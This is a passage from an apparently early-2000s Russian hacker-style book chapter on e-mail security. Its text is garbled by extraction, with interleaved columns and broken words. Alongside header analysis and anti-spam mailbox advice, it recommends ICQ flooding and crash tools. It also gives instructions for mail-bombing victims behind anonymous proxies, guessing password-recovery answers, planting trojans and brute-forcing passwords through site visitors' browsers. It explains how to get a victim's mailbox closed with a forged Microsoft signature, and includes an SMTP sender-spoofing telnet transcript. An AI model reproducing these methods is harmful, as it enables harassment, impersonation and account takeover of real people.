                                                                                                                                                                                                                                                                                           Проанализировав строку, выделенную жирным шрифтом, 
                                                                                                                                                                                                                                                                                                                                       получатель, скорее всего, решит, что письмо пришло с сервера 
E mail «безопасная» 78
77
Поэтому, мало иметь образцы заполнения «Received» каж
дым из узлов — необходимо выяснить средние задержки в достав
ке сообщений. Еще более сложно разобраться с алгоритмом гене
рации идентификаторов, добавляемых большинством транзитных
серверов к заголовку письма для избежания его зацикливания. Та
кой идентификатор уникален для каждого сервера и не может
представлять абсолютно случайное значение, поскольку, тогда бы
существовала возможность повторной выдачи одного и того же
идентификатора, что недопустимо.
Обеспечить уникальность помогает привязка ко времени пе
ресылки письма. Некоторые алгоритмы генерации идентификато
ра позволяют его обратить и узнать время, когда он был выдан.
Это позволяет выявить поддельные идентификаторы, а вместе с
ними и поддельные поля в заголовке письма.
E mail «безопасная»
Безопасность E mail
Безопасность E mail
идентификаторов. Разумеется, визуально ничего нельзя сказать о
том, как они были получены:
From owner sf news@securityfocus.com
Wed Sep 06 03:00:03 2000
Received: from lists.securityfocus.com ([207.126.127.68])
by hearst.mail.ru with esmtp (Exim 3.14 #4)
id 13WRh6 000LBx 00; Wed, 06 Sep 2000 02:59:57 +0400
Received: from lists.securityfocus.com
(lists.securityfocus.com [207.126.127.68])
by lists.securityfocus.com (Postfix) with ESMTP
id E62DC1EF74; Tue, 5 Sep 2000 15:58:34 0700 (PDT)
Received: from LISTS.SECURITYFOCUS.COM
by LISTS.SECURITYFOCUS.COM (LISTSERV TCP/IP release
1.8d) with spool
id 13121453 for SF NEWS@LISTS.SECURITYFOCUS.COM;
Tue, 5 Sep 2000 15:58:31 0700
Approved By: se@SECURITYFOCUS.COM
Впрочем, маловероятно, чтобы получатель обладал квали
фикацией, достаточной для проведения анализа подобного уров
ня. И большинство пользователей можно ввести в заблуждение
даже грубой подделкой заголовка.
Анонимное получение корреспонденции
При получении почты обычным способом сервер определя
ет (а некоторых случаях и запоминает) IP адрес подключившего
ся клиента. Но иногда получателю нежелательно раскрывать свой
адрес, даже если он динамический. Провайдер, выделяя абоненту
IP, запоминает (может запоминать) время, в которое он был вы
дан и имя пользователя, которому он был выдан. Поэтому, суще
ствует теоретическая возможность установить личность получате
ля письма.
Для сохранения полной анонимности можно воспользовать
ся специально разработанным скриптом, который читает коррес
понденцию и выкладывает ее на какой нибудь анонимный ftp
сервер. Это позволяет убить сразу двух зайцев — скрыть
E mail «безопасная»
79
собственный адрес и обойти один из недостатков POP3 протоко
ла — отсутствие докачки.
В самом деле, если в ящике лежит сообщение огромных раз
меров, а связь то и дело рвется, может потребоваться немалое ко
личество попыток, пока, наконец, письмо не попадет на локаль
ный компьютер. Напротив, скрипт, выполняющийся на сервере с
быстрым каналом, выполнит ту же операцию за значительно
меньшее время, и, выложив сообщение на ftp, значительно облег
чит клиенту получение письма, поскольку, теперь отпадет необ
ходимость начинать процесс перекачки с самого начала после
каждого разрыва соединения.
В приведенном ниже примере в качестве альтернативы Perl
использован язык Python, основные достоинства которого — про
стота и огромное количество всевозможных библиотек, поставля
емых вместе с языком. Ниже будет продемонстрировано исполь
зование одной из них.
Библиотека poplib скрывает от пользователя механизмы вза
имодействия клиента с POP3 сервером, и значительно упрощает
процесс программирования. Минимально функциональная про
грамма, читающая все письма, поступившие к этому моменту в
почтовый ящик, может выглядеть так:
#!/usr/local/bin/python
import poplib
print "Python's Mail client"
print "Connecting..."
M = poplib.POP3("mail.ru")
print "Login..."
M.user("MyLogin")
print "Password...."
M.pass_("MyUnpublishedPassword")
print "Get List of message"
numMessages = len(M.list()[1])
print "Numers of message : ",numMessages
for i in range(numMessages):
80
E mail «безопасная»
Безопасность E mail
Безопасность E mail
for j in M.retr(i+1)[1]:
print j
Вероятно, единственной проблемой окажется поиск серве
ра с установленным интерпретатором Python. На худой конец,
можно попробовать умаслить вашего администратора и уговорить
его установить питончика в системе.
Простая система защиты почтовых
ящиков
Наверняка, почти все пользователи Internet, работающие с
электронной почтой, сталкивались с ситуацией, когда их почто
вый ящик заливало море ненужной информации (например, рек
лама рождественских сувениров или корма для собак). Ясно, что
радости такие вещи не приносят: во первых, их скачивание из
ящика на свой компьютер занимает время, а значит, деньги, а во
вторых, зачастую такие письма просто забивают ящик под завяз
ку, и либо все вновь приходящие письма отправляются назад их
авторам, либо, что еще хуже, за их хранение приходится платить
деньги провайдеру, у которого ящик расположен. Отчего прихо
дят письма? Да просто оттого, что ваш адрес электронной почты
стал известен. К примеру, вы оставили в какой нибудь wеb кон
ференции объявление о поиске работы. Тот, кто зарабатывает на
рассылке рекламы, увидел ваш адрес и использовал его в своих
целях.
Другая опасная ситуация — это так называемые «почтовые
бомбы». К примеру, кто то вам крепко позавидовал и решил ис
портить жизнь. В результате каждый день в вашем ящике оказы
вается дистрибутив Windows 3.11, и вы ежедневно тратите полто
ра часа на забор почты. При этом нужные письма в ваш ящик
попасть не могут, так как он забит «подарком», а может быть и
того хуже — провайдер требует оплаты места под ящик, так как
его бесплатный лимит превышен.
E mail «безопасная»
81
Что делать? Безусловно, «почтовую бомбу» можно удалить и
посредством доступа по FTP к своему аккаунту у провайдера —
тогда письмо не придется скачивать. Можно также использовать
специальные программы вроде Magic Mail Monitor. Эти програм
мы предоставляют возможность удобно просматривать заголовки
сообщений и информацию об их отправителе и размере без за
грузки самих сообщений, а также удалять ненужные письма пря
мо с сервера провайдера. Но если «почтовые бомбы» приходят по
стоянно и «забивают» ящик, то использование таких программ
выходом не является.
Гораздо лучше поступить следующим образом. В Internet
есть большое количество серверов, предоставляющих бесплатные
почтовые ящики. Это www.mail.ru, www.rbcmail.ru, www.inbox.ru,
www.newmail.ru, www.chat.ru, www.tomcat.ru, и другие. Живут эти
системы за счет рекламы на своих страницах, а также за счет то
го, что каждый из них по сути как бы является действующим при
мером корпоративной почтовой системы, которую можно купить
у создателей бесплатного почтового сервера. Так сказать, реклама
на реальном примере.
Практически все серверы бесплатной почты (www.mail.ru,
www.rbcmail.ru, www.inbox.ru, www.newmail.ru, www.chat.ru,
www.tomcat.ru — уже сейчас, а в остальных такая возможность ли
бо уже имеется, либо проектируется) допускают доступ к ним как
с помощью почтовой программы, так и с помощью браузера. То
есть письма можно забирать обычной почтовой программой вро
де Outlook Express, а в случае прихода «почтовой бомбы» без про
блем удалить ее посредством доступа к ящику через браузер. К то
му же возможность обойтись только браузером для работы с
электронной почтой позволяет легко читать свою почту и отправ
лять письма не только из дома, но и при работе из Internet сало
нов, от друзей, с работы, причем в специальной настройке поч
товой программы и даже в ее наличии нет необходимости.
Но это – не единственное достоинство бесплатных почто
вых систем.
82
E mail «безопасная»
Безопасность E mail
Безопасность E mail
У очень многих из них есть полезная возможность перена
правления почты на другой адрес без ее сохранения! Это значит,
что все письма, приходящие, например, на адрес xxx@mail.ru, мо
гут автоматически, без какого либо участия пользователя пересы
латься на указанный им адрес. Такую возможность имеют серве
ры www.mail.ru, www.rbcmail.ru, www.inbox.ru, www.newmail.ru,
www.chat.ru и другие.
Кроме того, у развитых почтовых систем вроде www.mail.ru
имеется возможность фильтровать приходящую почту и отправ
лять назад или сразу уничтожать сообщения, удовлетворяющие
определенному критерию вроде наличия того или иного слова в
е mail адресе или теме. При этом в сам ящик такие сообщения
попадать не будут.
У таких серверов, как www.mail.ru, www.tomcat.ru имеется
возможность автоматически забирать почту с других почтовых си
стем. Надо лишь указать почтовый сервер, логин и пароль, и тог
да сборщик почты сам зайдет под указанными логином и паролем
на этот сервер и перекачает всю почту с него в ваш ящик на сер
вере с такой услугой.
Как это все можно использовать? Да очень просто. Создай
те систему своих ящиков! Например, в качестве своего основно
го ящика создайте ххх@mail.гu. Но его адрес никому не давайте!
Настройте свою почтовую программу на забор почты исключи
тельно с этого ящика. А теперь создайте еще три четыре ящика
на других бесплатных почтовых серверах или на том же под дру
гим именем (например, ххх@inbох.гu, ххх@сhаt.ru, ххх1@mаil.гu,
ххх2@mаil.ru, ххх3@mаil.ru) и настройте их на автоматическую пе
ресылку без сохранения всех входящих сообщений на ххх@mаil.гu.
Теперь вы можете дать адрес xxx@ inbox.ru своим друзьям и
подставлять в качестве обратного адреса своих писем именно его.
Адрес ххх@сhаt.ru пусть служит для официальной переписки. Ну,
а адреса ххх1@mаil.гu, ххх2@mаil.ru, хххЗ@mаil.ru оставляйте во
всех подозрительных местах: конференциях, гостевых книгах, до
E mail «безопасная»
83
сках объявлений (но только в них!). Также подписывайте этими
адресами ваши письма не очень надежным людям.
Чтобы иметь возможность выбирать желаемый обратный ад
рес для своих писем, например, в Microsoft Оutlоок Ехрress 5.0,
нужно создать в этой почтовой программе несколько учетных поч
товых записей с разными обратными адресами.
Во всех этих записях следует указать smtp сервер вашего
провайдера и отменить использование каждой записи для получе
ния почты. Для последнего у вас пусть служит отдельная учетная
запись, настроенная в данном случае на сервер ххх@mаil.ru.
При такой конфигурации почтовой программы и почтовых
ящиков вы будете забирать почту только с ящика ххх@mаil.гu,
подписывать же свои письма сможете любым обратным адресом
из имеющихся у вас остальных ящиков. Все письма, поступающие
на любой ваш ящик, будут в конце концов передаваться на ящик
ххх@mаil.гu, откуда вами и будут забраны.
Если вы имеете доступ только к электронной почте, без воз
можности использования Internet, то в качестве адреса пересыл
ки с ххх@mаil.гu поставьте свой почтовый адрес. Вся остальная
система пересылок будет функционировать автономно.
Теперь в случае прихода на один из оставленных вами в пуб
личном месте адресов (ххх1@mаil.гu и т. д.) массовых рассылок
рекламы вы можете поставить на этом ящике фильтр на входя
щую почту, чтобы они отправлялись обратно. Если же этой меры
окажется недостаточно, то ничто не мешает временно отключить
замусориваемый рекламой ящик от пересылки почты (пусть все в
нем остается!), а когда отправитель рекламы перестанет его засо
рять своими посланиями (неоднократно получив их назад с по
меткой «почтовый ящик адресата переполнен»), можно будет за
минуту очистить этот ящик от мусора через доступ посредством
браузера (при желании, прочитав или оставив полезные письма)
и включить пересылку снова.
84
E mail «безопасная»
Безопасность E mail
Безопасность E mail
■ 
У такой разветвленной почтовой системы есть еще одно
преимущество. Объем почтовых ящиков на всех бесплатных поч
товых серверах не превышает двух трех мегабайт. Если объем при
ходящей почты больше этого предела, то почта отправляется об
ратно с пометкой «Почтовый ящик переполнен». Но если на этот
ящик поставлено перенаправление с другого ящика, то почта,
пришедшая на этот другой ящик, попросту задерживается на нем
до тех пор, пока первый ящик не освободится. То есть вы може
те, например, создать себе еще два ящика геz1@mail.ru и
геz2@vail.ru, поставить с первого перенаправление без сохранения
на второй, а на первый перенаправить всю почту с вашего основ
ного ящика ххх@vail.ru. Теперь можно спокойно уезжать в коман
дировку. Если объем пришедшей после всех перенаправлений на
геz2@mail.ru почты будет больше двух мегабайт, то почта будет за
держиваться на геz1@mail.ru, а если и этот ящик будет перепол
нен, — то на ххх@mail.ru. Приехав домой, вы заберете почту с
геz2@mail.ru, а с геz1@mail.ru и ххх@mail.ru специальную почту
можно будет даже и не забирать – она постепенно перейдет на
геz2@mail.ru, как только тот будет освобожден.
Итак, у бесплатных почтовых сервисов есть следующие пре
имущества:
■
Возможность чтения своей почты из любого места
доступа в Internet без использования почтовых
программ.
E mail «безопасная»
85
Возможность удаления слишком больших и
                                 ненужных сообщений без их загрузки на свой
                                                                    компьютер.
■ Возможность автоматического сбора почты с других
                                              ящиков.
■ 
Иногда после долгого процесса выбора провайдера по всей
Сети остаются раскиданными старые почтовые ящики у «бывших
в использовании» провайдеров. Чтобы постоянно не забирать
почтовой программой из них почту, можно настроить для этой це
ли специальные сборщики почты на www.mail.ru или
www.tomkat.ru и вообще забыть про существование этих ящиков.
Возможность установки фильтров на входящую
                                     почту.
■ 
В случае получения вами «почтовых бомб» можно поступить
так же. Удалить же уже пришедшие «бомбы» через доступ посред
ством браузера не составит труда.
И, наконец, возможность перенаправления почты на
                                        другие адреса.
Надо сказать, что установить фильтры на входящую почту
можно и в своей почтовой программе, если она это допускает. На
пример, в программе Microsoft Оutlоок Express 5.0 для этого слу
жит пункт Сервис ➪ Правила для сообщений ➪ Почта.
Правило в данном случае — это схема поведения програм
мы Оutlоок Express при получении сообщения. Программа может
выбирать из всех входящих сообщений содержащие какое нибудь
слово в адресе, теме, самом тексте или имеющие слишком боль
шой размер. Выбранные сообщения могут быть сразу направлены
в какую нибудь папку, пересланы по другому адресу. Но наибо
лее ценной является возможность сразу удалять с сервера ненуж
ные сообщения, не загружая их и даже не уведомляя пользовате
ля об этом. Для этого просто нужно соответствующим образом
настроить правила.
Возможность Microsoft Оutlоок Express 5.0 создавать прави
ла для сообщений может спасти пользователя от необходимости
скачивать большой объем ненужной информации при получении
почты, но сам ящик при ее использовании не защищается, и он
может быстро переполниться. Поэтому для полной безопасности
от нежелательных рассылок (еще называемых спамом) и «почто
вых бомб» лучше использовать «глубоко эшелонированную» обо
рону, подобную описанной выше, создать на бесплатном сервере
ящик, откуда почта будет забираться почтовой программой, со
здать еще один ящик с перенаправлением на первый (на случай
отъезда или невозможности забирать почту долгое время), а так
86
E mail «безопасная»
Безопасность E mail
Безопасность E mail
же зарегистрировать три четыре ящика с красивыми именами для
раздачи их в качестве своих е mail адресов и поставить перена
правления с этих ящиков на второй. Ну, и свою почтовую про
грамму стоит настроить соответствующим образом (например, ус
тановив правила для сообщений в Оutlоок Express), — если письмо
больше мегабайта, то его сначала стоит посмотреть через браузер,
а потом уже загружать себе, если окажется нужным.
Существуют и зарубежные аналоги российских бесплатных
почтовых серверов, но я бы не рекомендовал их использовать, так
как связь с ними, как правило, медленнее, а значит, ваша почта
обойдется вам дороже. К тому же не все они предоставляют воз
можность доступа к ним с помощью почтовой программы.
Поэтому я настоятельно рекомендую вам обратить внима
ние на перечисленные выше российские бесплатные почтовые
серверы.
Хакерское программное обеспечение
для ICQ
IsoaQ — клевый патч для самых последних версий ICQ.
Каждая версия может патчить сразу несколько версий и буилдов.
Среди функций такие как: скрытие IP, добавление пиплов в кон
такт лист без авторизации, показ чужих IP адресов и многое мно
гое другое. Очень рекомендую.
ICQ99aIPUnhide — патчит аську для показа всех IP. Вот
только патчит только начальные буилды 99a. А их вряд ли кто ис
пользует.
ICQ Flooder — флудер для аськи. Надо знать IP и порт.
Единственное достоинство — возможность слать от чужих ЮИН
нов.
ICQ Crack — не понятно на какую версию аськи он дейст
вует, и действует ли он вообще когда нибудь. Позволяет добав
лять людей в свой контакт лист без авторизации (если верить сло
E mail «безопасная»
87
вам разработчиков). На меня она произвела впечатление обычной
DOS программы, выводящей надпись File Not Found. Есть веро
ятность, что это троян, т.к. занимает она подозрительно мало для
полезной программы (841 байт).
ICKiller — почти такая же как и ICQ Flooder, только с улуч
шенным интерфейсом. Когда я нажал кнопку HELP, он мне го
лосом сказал: «You suck!», — и создал файл 1.exe, который оказал
ся вирусняком. Пока я понял только то, что он забивает
оперативную память (постоянно запускает сам себя и regedit).
Есть подозрение, что делает он и другие гадости. Антивирусами
не лечится.
Ximer — убивает аську. Есть возможность проводить атаку с
другого хоста (надо знать IP и порт).
X ICQ Chat — штука для приколов в ICQ чате. Я в ICQ ча
тах не сижу, программу не юзал, не знаю что это такое.
X ICQ — куча софта в одном флаконе + оболочка, объеди
няющая их. Единственное, что еще не встречалось — сканер ICQ
порта, который не пускается. Требует какой то там DLL. Я не ус
танавливал. Мои друзья устанавливали, говорят, все равно не
идет.
ICQ Profile Move — сохраняет контакт лист. Но делает это
настолько через задницу и неграмотно, что остается только посо
чувствовать. Под словом «сохранить контакт лист» создатели име
ли ввиду создать файл, содержащий инфу о ком то, используя
твою аську. Потом эти файлы можно этой же программой встав
лять в аську. Вот только с этим напряги. Частенько со многими
буилдами бывают глюки. Ну хорошо. А что мне делать если у ме
ня контакт лист на 80 человек? Хочу еще заметить: надо вводить
не ник, и не выбирать из списка, а писать номер ЮИН’а. Это хо
рошо, если номера короткие и легко запоминаются, а если нет?
Да я себе лучше просто скопирую каталог аськи и буду жить спо
койно.
ICQ Revenge — ОЧЕНЬ кульная программа. Позволяет слать
анонимные письма на аську. Причем знать для этого надо только
88
E mail «безопасная»
Безопасность E mail
Безопасность E mail
■ Все, что нужно, это подключиться к 25 порту
                                   какого нибудь почтового сервера (даже не
                                                                    обязательно почтового, а просто того на котором
                                                                                                           работает старая версия почтового демона, или к
                                                                                                                                                 компьютеру, предоставляющему почтовый доступ к
                                                                                                                                                                                         FTP sit’ам и представившись тем, кому вы желаете
                                                                                                                                                                                                                           подложить свинью заказать пару сотню файлов на
                                                                                                                                                                                                                                                                  ваше усмотрение).
■ Воспользоваться анонимным мейл генератором.
                                          Спецовая прога, которая создаёт огромное
                                                                            количество писем и посылает их по адресу с вашего
                                                                                                                    компа. Таких прог существует куча, вот типичные
                                                                                                                                                          проги: HackTek и ещё лучше Avalanch. Только не
                                                                                                                                                                               забудь включить анонимный прокси. Хотя, почти с
                                                                                                                                                                                                                     каждой такой программой прилагается хороший
                                                                                                                                                                                                                                                           прокси лист. Если нет — бегом на www.void.ru.
■ Воспользоваться почтовой службой общественного
                                              пользования, типа www.mail.ru или www.inbox.ru и
                                                                под анонимным логином отослать штук 20 писем
                                                                                                   размером по 500 Кб. Это самый гиморный способ,
                                                                                                                                    да и к тому же письма отсылаются медленно, но
                                                                                                                                                                       гораздо быстрее, чем это было бы с твоего компа.
                                                                                                                                                                                                            Опять же обязательно врубай анонимный прокси.
■ 
UIN!! Можно слать сообщения от чужого e mail’а. Причем даже
от несуществующего.
Подписать атакуемое мыло на какую нибудь
                                  рассылку (или эхо) (типа компьютерные клубы, где
                                                                       обсуждаются разные темы среди большого круга
                                                                                                             людей. В принципе тут проблем нет, но я не советую
                                                                                                                                                   этим злоупотреблять, т.к. это ламерские шутки.
                                                                                                                                                                                       Используйте их, если есть повод. Вот типично: вы
                                                                                                                                                                                                                            договорились об обмене данными, а ваш партнёр
                                                                                                                                                                                                                                                                 обманул вас. Вот тут это и пригодится. Флуд — это
                                                                                                                                                                                                                                                                                                       как ядерное оружие — все об этом знают, но никто
                                                                                                                                                                                                                                                                                                                                             им не пользуется, зато в мире порядок и дружба.
                                                                                                                                                                                                                                                                                                                                                                                 Теперь ты тоже ядерная страна.
Взлом мыла (user manual)
Работать с почтой можно по разному. Работать в браузере
на страничках почтовых служб наиболее глупо и небезопасно (хо
тя в случае внезапной потери всей инфы на винте это пригодит
ся, т.к. письма хранятся на серваке почтовой службы). Однако ча
ще пользуются мейлерами — спецовыми прогами, которые
скачивают почту с серваков и выдают тебе её на блюдечке. Ти
пичный пример — OutLook Express, который поставляется вместе
с Маcтдаем и потому многие его используют.
Как можно узнать пароли к чужому ящику? Существует мас
са способов. Например, в некоторых почтовых службах предлага
ют услуги по подсказке пароля к аккаунту, если ты сообщишь им
дату создания этого ящика или ответишь на некоторый вопрос
(который ты сам задаешь при создании шампуня). Ответы на эти
вопросы можно незаметно выудить из самого человека (метод Со
циального Перегруза или БиоХака) или попытаться подобрать са
мому. Например, самый распространенный вопрос — «Как меня
зовут?» или «Девичья фамилия матери». Ну, и вариации на эту те
му!
Подобная штука есть на www.mail.ru, www.e mail.ru и
www.newmail.ru. Конечно, самый надёжный способ узнать пароль
— это офф или он лайн шпионство (типа засылка троянов).
Здесь, как говорится, результат не заставит себя долго ждать.
Теперь поговорим о конкретном: атака на мыло — это, в ос
новном, флуд/cпам ящика. Флуд — это когда ты утром проверя
ешь почту — а там 1000 писем 100 килобабного содержания. Вот
и попробуй разобраться с ними. Вообще то зафлудить мыло про
ще пареной репы, поэтому этот способ используют только дауны
и ламеры! Вот, к примеру несколько способов:
E mail «безопасная»
89
90
E mail «безопасная»
Безопасность E mail
■
Безопасность E mail
Jul 1999 23:16:45 +0400
Received: (from mail@localhost) by camel.mail.ru
(8.9.2/8.9.1) id XAA64053; Sun,
11 Jul 199923:16:45 +0400 (MSD)Date: Sun, 10 Jun 1899
13:17:51 +0400 (MSD)
#Вот и дата прибытия письма на мой почтовый сервак.
Message Id: 199907111916.XAA64053@camel.mail.ru
#Уникальный номер письма. Если тебя зафлудили или
прислали что нибудь нехорошее, то ты можешь нажаловаться
админу почтового сервака, переслав ему эти письма.
Подробнее читай ниже.
Received: from [212.46.8.60] by win.mail.ru with HTTP;
Sun, 10 Jul 1985 19:16:45 +0000 (GMT)
#Попался! IP шник приславшего с датой отправки
From: =?KOI8 R?Q?"Ипполит=20Т"?= (sony lamer@mail.ru)
#Кодировка отправления и мыло отправителя
To: system@local.net
#это ты.
Cc: sony lamer@mail.ruSubject: =?KOI8 R?Q?Re:=20Ксакеп
круто=кул?=
Mime Version: 1.0X Mailer: The Bat! (v1.33) S/N 9EB473C9
#Посылал The Bat! версия и регистрационный номер как на
ладони.
X Originating IP: [212.46.8.60]?IP'шник
товарища,отправившего мне письмо.
Content Type: text/plain; charset=koi8 r
#Сообщение выслано прямым простым текстом в кодировке
KOI8 R
Content Transfer Encoding: 8bit?
Далее идет никому не нужная муть.
Зафлудить ящик с помощью cgi скрипта на твоей
паге.
К каждому письму прикрепляется небольшая шапка, кото
рая содержит много интересной информации: IР шник, название
и регистрационный номер программы — мейлера, которым поль
зуется приславший письмо, почтовая служба, уникальный номер
письма, путь прохождения письма до вас, время отправления и
прибытия, номер компа в локальной сети и многое другое. Одна
ко, всё это скрыто от читателя, т.е. тебя! Давай посмотрим эту ин
тересную инфу. Если ты всё еще пользуешься Outlook ом, то от
кроем исследуемое письмо и жмем Файл, затем Свойства и
выбираем закладку Подробности. Теперь всё на виду. В The Bat!
делаем так: Открываем письмо, жмём Просмотр и выбираем Слу
жебная информация. Сверху письма прибавляется шапка.
О том, что можно вытянуть из шапки, Я покажу тебе на при
мере.
# — МОИ КОММЕНТАРИИ.
Return Path: sony lamer@mail.ru
#Установленный адрес возврата, но он мало что говорит,
т.к. его с лёгкостью можно подделать (мы сами ставим его
в настройках).
Received: from relay1.aha.ru ([195.4.67.135] verified) by
aha.ru (CommuniGate Pro SMTP 3.2b4)
with ESMTP id 4637825 for system@local.net; Sun, 10 Jun
1899 13:17:51 +0400
#Дата получения послания моим почтовым серваком
Received: from elephant.mail.ru (elephant.mail.ru
[194.226.198.85]) by relay1.aha.ru
(8.9.3/8.9.3/aha r/0.04B) with ESMTP id XAA00604 for
(system@local.net); Sun, 11 Jul 1999 23:16:46+0400 (MSD)
#Дальше пошли почтовые серваки с их IPшниками и датами
получения\пересылки
Received: from camel int ([10.0.1.1] helo=camel.mail.ru)
by elephant.mail.ru
with esmtp (Exim2.12 #1) id 113P5h 000NVu 00; Sun, 11
E mail «безопасная»
91
Способы послать анонимный e mail мы уже рассмотрели
выше на примере, как зафлудить ящик. В этом случае нужно про
сто послать всего одно сообщение, а не 10000! То, что вас не уз
нают — это 100%. Только не нарывайтесь на международные
службы типа FBI или ФАПСИ, они могут узнать ваш IP у про
92
E mail «безопасная»
Безопасность E mail
Безопасность E mail
кси сервера (вот им он точно расскажет!). Но, я думаю, вы люди
умные и сами сможете определить — на кого стоит нарываться, а
с кем лучше дружить (правило хакера: не ссорься со всеми сразу!).
Можно так же узнать пароли на мыло и прямым Brute Force.
Но используя ресурсы только твоего компа — это может занять
месяц! Тут нужно действовать по другому. Возможно организо
вать Brute Force атаку с вашей паги (page) используя Java апплет.
И каждый посетитель вашей странички (с согласия или без) бу
дет принимать участие в кряке! В этом случае можно сломать па
роль и за 2 4 дня! Если у тебя выделенка — уже лучше, но лучше
использовать рут шелл.
Рассматривать захват почты буду на примере халявной поч
товой службы. В принципе, так можно захватить любой ящик в
сети. Итак, ищем жертву. Допустим, это Вася Пупкин с мылом
sony lamorz@mail.ru. Для начала ты должен отправить ему на мы
ло любое письмо для проверки, в котором попросить, найдя лю
бую причину, отправить вам обратно это письмо как можно бы
стрее. Способ работает только тогда, когда владелец регулярно
проверяет свою почту, в данном случае почту sony lamorz@mail.ru.
А если нет, зачем тебе тогда это мыло? Вам необходимо написать
на английском письмо со спамом, надеюсь этому учить не надо,
хотя для тех кто не умеет выражаться, вот пример.
Вы отправляете ему это письмо в txt файле и просите по
слать ламера это письмо со спамом вам обратно на почту, только
нужно, чтобы ламер скопировал данный спам и послал как обыч
ное письмо, без прикрепленного файла. Дальше пишешь умную
мессагу админу мэил.ру (support@mail.ru) и говоришь в ней, мол,
такой то ублюдок занимается спамом, флудом и, вообще, онаниз
мом. И прилагаешь еще данное письмо со спамом. Через несколь
ко часов тебе приходит извещение от админа посмотреть всю ин
фу о пользователе, пославшем вам это письмо, это делается очень
просто: открываешь письмо ламера, посланное тебе со спамом,
нажимаешь на кнопочку more details, или вроде того, и копиру
ешь всю инфу об этом письме и владельце данного письма.
E mail «безопасная»
93
Шлешь ее админу мэил.ру, он проверяет своими способами, бы
ло ли и вправду отправлено данное письмо, а так как ламер вам
сам его послал, то оно, естественно, было отправлено вам, и в по
следствии вам приходит благодарность и ящик пива от админа мэ
ил.ру, в письме от админа будет говориться то, что данный ящик
закрыт благодаря таким людям как ты! Отечество тебя не забудет,
перец. Данный способ обмана почтовых служб работает только на
бесплатных почтах, на платных настоящего юзера не закроют, у
него сначала 50 раз спросят, было ли все так, как я говорю. Луч
ше в конце письма сделать небольшую приписочку, вроде:
С уважением, Егоров Андрей (#имя вымышленное)
Представительство Microsoft в России
E mail:rus_microsoft@mail.ru
http://www.microsoft.com/rus
Это подтвердит то, что ты крутой перец из крупной конто
ры, а не малолетний придурок. По той же причине писать нужно
грамотно.
Система E mail содержит много дыр, просчетов и т.п. Боль
шинство из них были исправлены с появлением так называемого
ESMTP, однако даже этот протокол все еще может быть исполь
зован в «корыстных» целях. Наиболее ярким примером эксплуа
тирования системы электронной почты может являться например,
посылка почты с ЛЮБОГО адреса.
Процесс заключается в следующем — необходимо найти
почтовый сервер, не поддерживающий ESMTP, но работающий
по протоколу SMTP, или напрямую обратиться к серверу, на ко
тором среди пользователей находиться наша жертва. Вот как все
должно выглядеть:
daemon# telnet www.otstoy.ru 25
#Вызов программы telnet, с указанием подключиться к
машине `www.otstoy.ru' к порту #25
Trying 127.0.0.1...
#Машина `daemon' — это имя моего компьютера и имеет
соответственно адрес 127.0.0.1, на ней на 25 порте сидит
94
E mail «безопасная»
Безопасность E mail
Безопасность E mail
почтовый сервер
Connected to localhost.
Escape character is '^]'.
220 daemon.localdomain ESMTP Sendmail 8.8.7/8.8.7; Fri, 7
Aug 1998 17:09:13 +0400
#На машине установлен Sendmail 8.8.7/8.8.7
Последняя строчка содержит информацию, которая нам не
обходима, попробуем прочитать ее:
daemon.localdomain — имя компьютера на котором запущен
почтовый сервер, т.е. демон sendmail, который собственно и есть
объект если не взлома, то обмана. Далее sendmail сообщает нам,
руководствуясь каким протоколом он работает, это ESMTP. На
конец, сообщается версия sendmail’а и время подключения с ука
занием часового пояса относительно которого истинно время под
ключения.
VRFY адрес
Проверить, а есть ли здесь такие?
EXPN адрес
Или посмотреть почтовые псевдонимы
DATA
Собственно идентификатор начала сообщения
QUIT
See you
RSET
Дисконнект
HELP
Можно глянуть полный список команд того почтового
демона, к которому мы подключились
А вот пример подключения к старому варианту почтового
демона:
daemon# telnet kinglair.lostworld smtp
Trying 192.83.83.11...
Connected to kinglair.lostworld.
Escape character is '^]'.
220 kinglair.lostworld SMTP Ready.
Как видно, этот демон говорит на языке SMTP. Далее мы
можем написать какую нибудь команду. Вот неполный список ко
манд, в соответствии с протоколом Simple Mail Trasnfer Protocol.
Итак, пошлем первое наше анонимное письмо.
daemon# telnet www.mustdie.com 25
Trying 127.0.0.1...
Connected to daemon.
Escape character is '^]'.
220 daemon.localdomain ESMTP Sendmail 8.8.7/8.8.7; Fri, 7
Aug 1998 19:37:14 +0400
HELO damned.lostworld.com
#Представляемся некоторой удаленной сетевой машиной с
именем 'damned.lostworld.com'
250 daemon.localdomain Hello root@daemon [127.0.0.1],
pleased to meet you
#Однако sendmail меня все равно узнает
MAIL From: zlob@damned.lostworld.com
#Ложный адрес отправителя
250 zlob@damned.lostworld.com... Sender ok
#Сработало!
RCPT To: root Письмо предназначается пользователю root на
этой машине
HELO имя_машины
Приятно познакомится. Взаимно
MAIL From: обр_адрес
От кого везем письмо
RCPT To: адрес_назначения
Кому везем
E mail «безопасная»
95
96
E mail «безопасная»
Безопасность E mail
Безопасность E mail
250 root... Recipient ok Open <name_of_ftp_site>
  DATA 
  354 Enter mail, end with "." on a line by itself 
  Hello me ! 
  . 
  #Точка означает конец ввода 
                         250 TAA04503 Message accepted for delivery 
                         QUIT 
                         221 daemon.localdomain closing connection 
                         Connection closed by foreign host. 
                         Теперь самое время прочитать почту. В случае использова 
                                                                        ния ESMTP можно будет понять, что полученное письмо поддель 
                                                                                                                     ное, однако в любом более менее современном юзер ориентиро 
                                                                                                                                                                      ванном средстве работы с электронной почтой в поле от кого 
                                                                                                                                                                                                                       будет стоять damnedman@damned.lostworld.com. и при нажатии 
                                                                                                                                                                                                                                             кнопки Reply ответ будет направлен именно по этому адресу. 
Однако посылка подобного рода писем не исчерпывает все Вернёмся к безопасности мыла! Одно из главных правил не
                                               го того, что вы можете сделать используя недочеты и промахи раз только хакера, но и просто пользователя Internet — нельзя прене
                                                                                                   работчиков почтовых протоколов. Вернее сказать их излишнее брегать сложностью паролей. Вот основные правила.
                                                                                                                                                      стремление сделать все просто и удобно. В свое время существо 
                                                                                                                                                                                                         вало такое понятие как почтовый доступ. Оно заключался в том, 
                                                                                                                                                                                                                                                           что общение проходило в режиме оффлайн, так как сейчас в ФИ 
                                                                                                                                                                                                                                                                                                           ДО. Так вот, с появлением общедоступных FTP серверов возник 
                                                                                                                                                                                                                                                                                                                                                         ла необходимость каким либо образом получать к ним доступ с 
                                                                                                                                                                                                                                                                                                                                                                                                           помощью электронной почты. Тогда был придуман способ назы 
                                                                                                                                                                                                                                                                                                                                                                                                                                                            ваемый «ftp via e mail» (есть еще и Www, archie, gopher via e mail 
